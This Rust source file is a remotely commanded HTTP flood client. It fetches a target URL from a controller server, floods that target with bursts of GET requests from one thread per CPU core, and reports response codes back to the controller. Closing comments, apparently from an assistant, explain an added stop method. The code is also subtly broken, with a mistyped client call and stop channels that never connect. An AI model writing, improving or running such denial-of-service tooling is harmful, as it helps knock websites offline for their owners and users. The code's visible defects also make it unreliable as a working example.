use serde_json;
use std::sync::{Arc, Mutex, Condvar};
use std::sync::mpsc::{self, Sender, TryRecvError};
use std::time;
use dashmap::DashMap;

//client struct
struct Client {
    host_address: String,
    address: String,
    attacking: bool,
    workers: Vec<Arc<(Mutex<Worker>, Condvar)>>,
    worker_threads: Vec<std::thread::JoinHandle<()>>,
    results: Arc<DashMap<u32, Vec<String>>>,
    thread_count: usize,
    stopper: Sender<()>,
}

//worker struct
struct Worker {
    id: u32,
    host_address: String,
    attacking: bool,
    address: String,
    client: reqwest::blocking::Client,
    results: Arc<DashMap<u32, Vec<String>>>,
}

//worker methods
impl Worker {
    //constructor
    fn new(addr: String, host: String, map: Arc<DashMap<u32, Vec<String>>>, id: u32) -> Worker {
        let client = reqwest::blocking::Client::new();
        let mut add = host.clone();
        add.push_str("/attack_info");
        Worker { host_address: add, attacking: false, address: addr, client, results: map, id }
    }

    //sends 1 request and returns 0 if successful, 1 if not, pushes to the map results
    fn start_requesting(&self) -> i32 {
        if self.attacking {
            let to_attack = self.address.as_str();
            let result =    lient.get(to_attack).send();
            return match result {
                Ok(_) => {
                    let res = result.unwrap();
                    let code = res.status().as_u16().to_string();
                    let body = res.text().unwrap();
                    let response_body = serde_json::json!({"code": code, "body":body});
                    let local_instance = self.results.clone();
                    local_instance.get_mut(&self.id).unwrap().push(response_body.to_string());
                    0
                }
                Err(_) => {
                    1
                }
            };
        }
        1
    }
}

//client methods
impl Client {
    //constructor
    fn new(host: String) -> Client {
        let thread_count = std::thread::available_parallelism().unwrap().get();
        let (tx, _) = mpsc::channel();
        let mut cl = Client {
            host_address: host,
            address: String::new(),
            attacking: false,
            workers: vec![],
            worker_threads: vec![],
            results: Arc::new(DashMap::with_capacity(thread_count)),
            thread_count,
            stopper: tx,
        };

        cl.worker_threads.reserve(thread_count);
        for i in 0..thread_count {
            cl.results.insert(i as u32, vec![]);
            cl.workers.push(Arc::new((
                Mutex::new(Worker::new(cl.address.clone(), cl.host_address.clone(), cl.results.clone(), i as u32)),
                Condvar::new()
            )));
        }
        return cl;
    }

    fn can_attack(&mut self) {
        let url = self.host_address.as_str();
        let req = reqwest::blocking::get(format!("{}/api/attack", url)).unwrap().json::<String>().unwrap().
            strip_prefix("{\"").unwrap().to_string().strip_suffix("\"}").unwrap().to_string();
        let attack_address_url = req.split("\":\"").collect::<Vec<&str>>()[1];
        let mut can_attack = !attack_address_url.is_empty();
        self.address         = attack_address_url.to_string();
        self.attacking = can_attack;
        for el in self.workers.iter_mut() {
            let clone_el = el.clone();
            let (mx, cv) = &*clone_el;
            let worker_lock = mx.lock();
            match worker_lock {
                Ok(_) => {
                    let mut worker = worker_lock.unwrap();
                    worker.address = self.address.clone();
                    worker.attacking = can_attack;
                    if can_attack {
                        cv.notify_one();
                    }
                }
                Err(_) => {}
            }
        }
    }

    fn thread_worker(worker: Arc<(Mutex<Worker>, Condvar)>, stopper: mpsc::Receiver<()>) {
        let el = worker.clone();
        let (elem, cv) = &*el;
        loop {
            match stopper.try_recv() {
                Ok(_) | Err(TryRecvError::Disconnected) => {
                    println!("Stopping worker...");
                    break;
                }
                Err(TryRecvError::Empty) => {}
            }
            let mut w = elem.lock().unwrap();
            if !w.attacking {
                w = cv.wait_while(w, |w| !w.attacking).unwrap();
            }
            drop(w);
            std::thread::sleep(time::Duration::from_nanos(1));
            let w = elem.lock().unwrap();
            let mut _r = 0;
            for _ in 0..100 {
                _r = w.start_requesting();
            }
        }
    }

    fn run(mut self) {
        for i in 0..self.thread_count {
            let ind = i.to_owned().clone();
            let worker = self.workers[ind].clone();

            let (_, rx) = mpsc::channel();
            self.stopper = mpsc::Sender::clone(&self.stopper);

            self.worker_threads.push(std::thread::spawn(move || {
                Client::thread_worker(worker, rx);
            }));
        }

        self.can_attack();

        let addr = self.host_address.to_owned().clone();
        let armap = self.results.to_owned().clone();
        let handl = std::thread::spawn(move || {
            let time = time::Duration::from_millis(950);
            let cl = reqwest::blocking::Client::new();
            let map = &*armap;
            loop {
                std::thread::sleep(time);
                let mut request_body_vec = Vec::new();
                for el in map.iter() {
                    request_body_vec.extend(el.value().to_owned());
                }
                println!("Throughput: {}", request_body_vec.len());
                if request_body_vec.len() >= 20 {
                    cl.post(format!("{}/attack_info", addr.to_owned().clone())).json(&request_body_vec).send().unwrap();
                    map.alter_all(|_, mut v| {
                        v.clear();
                        v
                    });
                }
            }
        });
        loop {
            self.can_attack();
        }

        handl.join().unwrap();
        while self.worker_threads.len() > 0 {
            let thread = self.worker_threads.pop().unwrap();
            thread.join().unwrap();
        }
    }

    fn stop(self) {
        for _ in &self.worker_threads {
            self.stopper.send(()).unwrap();
        }
    }
}

#[no_mangle]
pub extern "C" fn main() {
    let mut cl = Client::new(String::from("http://localhost:8080"));
    cl.run();
    // at some point you would call cl.stop() to stop the threads
    //cl.stop();
}


// You would want to call cl.stop() at some point to stop the threads. For example, you might call cl.stop() in a signal handler,
//  or in response to a command from the user. Note that cl.run() currently contains an infinite loop, which you'd 
//  need to replace with appropriate stopping condition. This loop was there in the provided code and I have kept it for consistency.
// 
// The new stop() method signals all worker threads to stop by sending a message on the Sender. Each worker thread has a
//  Receiver and checks it in each iteration of its main loop. If it receives a message (or if the Sender is dropped, which
//  happens when all copies of the Sender go out of scope), it breaks out of the loop and ends.